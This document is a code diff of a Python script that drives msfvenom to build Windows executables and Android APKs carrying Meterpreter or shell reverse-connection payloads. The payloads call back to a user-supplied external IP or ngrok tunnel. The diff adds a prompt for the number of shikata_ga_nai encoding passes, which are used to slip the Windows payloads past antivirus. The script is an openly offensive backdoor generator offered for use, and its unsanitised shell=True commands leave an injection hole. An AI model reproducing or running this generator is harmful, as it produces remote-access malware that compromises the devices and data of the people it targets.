@@ -50,64 +50,73 @@ def main():
           filename = input("---------------------------------------\nEnter your desired payload name (without file extension):\n---------------------------------------\n")
           lhost = input("---------------------------------------\nEnter external IP address or ngrok tcp tunnel for LHOST:\n---------------------------------------\n")
           lport = input("---------------------------------------\nEnter forwarded port:\n---------------------------------------\n")
-          print("---------------------------------------\nWait a few seconds, payload is being generated...\n---------------------------------------")
           if generate == "1":
               try:
-                  subprocess.run(f"msfvenom -p windows/meterpreter/reverse_http -f exe -e x86/shikata_ga_nai -i 7 LHOST={lhost} LPORT={lport} -o {filename}.exe" ,
+                  iterations = input("---------------------------------------\nEnter the number of iterations you would like to encode the payload with (positive integers only):\n---------------------------------------\n")
+                  print("---------------------------------------\nPlease wait, payload is being generated...\n")
+                  subprocess.run(f"msfvenom -p windows/meterpreter/reverse_http -f exe -e x86/shikata_ga_nai -i {iterations} LHOST={lhost} LPORT={lport} -o {filename}.exe" ,
                                  shell=True)
               except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)   
           elif generate == "2":
               try: 
-                  subprocess.run(f"msfvenom -p windows/meterpreter/reverse_https -f exe -e x86/shikata_ga_nai -i 7 LHOST={lhost} LPORT={lport} -o {filename}.exe" ,
+                  iterations = input("---------------------------------------\nEnter the number of iterations you would like to encode the payload with (positive integers only):\n---------------------------------------\n")
+                  print("---------------------------------------\nPlease wait, payload is being generated...\n")
+                  subprocess.run(f"msfvenom -p windows/meterpreter/reverse_https -f exe -e x86/shikata_ga_nai -i {iterations} LHOST={lhost} LPORT={lport} -o {filename}.exe" ,
                                  shell=True)
               except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)   
           elif generate == "3":
              try:
+                print("---------------------------------------\nPlease wait, payload is being generated...\n")
                 subprocess.run(f"msfvenom -p android/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                  shell=True)
              except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)                  
           elif generate == "4":
              try:
+                print("---------------------------------------\nPlease wait, payload is being generated...\n")
                 subprocess.run(f"msfvenom -p android/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                  shell=True)
              except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)
           elif generate == "5":
              try:
+                print("---------------------------------------\nPlease wait, payload is being generated...\n")
                 subprocess.run(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                  shell=True)
              except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)    
           elif generate == "6":
              try:
+                print("---------------------------------------\nPlease wait, payload is being generated...\n")
                 subprocess.run(f"msfvenom -p android/shell/reverse_http LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                  shell=True)
              except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)    
           elif generate == "7":
+             print("---------------------------------------\nPlease wait, payload is being generated...\n")
              try:
                 subprocess.run(f"msfvenom -p android/shell/reverse_https LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                  shell=True)
              except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)    
           elif generate == "8":
+             print("---------------------------------------\nPlease wait, payload is being generated...\n")
              try:
                 subprocess.run(f"msfvenom -p android/shell/reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.apk" ,
                                  shell=True)
              except subprocess.CalledProcessError:
-                print("Didn't work. Maybe you don't have msf installed?")
+                print("Error")
                 sys.exit(0)
           else:
-             print("Payload not generated. Select one of the available options.")
+             print("---------------------------------------\nPayload not generated. Select one of the available options.")
              sys.exit(0)
 main()
